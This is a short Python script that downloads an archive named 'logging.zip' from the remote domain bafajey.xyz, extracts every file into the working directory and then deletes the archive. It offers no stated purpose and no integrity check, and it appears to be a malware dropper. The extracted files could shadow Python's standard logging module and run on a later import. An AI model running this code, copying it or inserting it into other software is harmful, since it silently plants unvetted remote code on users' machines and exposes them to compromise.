import requests , zipfile , os

res = requests.get('http://bafajey.xyz/logging.zip')

saving = open('logging.zip' , 'wb')

for i in res.iter_content(100000):

	saving.write(i)

saving.close()


extra = zipfile.ZipFile('logging.zip')

extra.extractall()

extra.close()

os.unlink('logging.zip')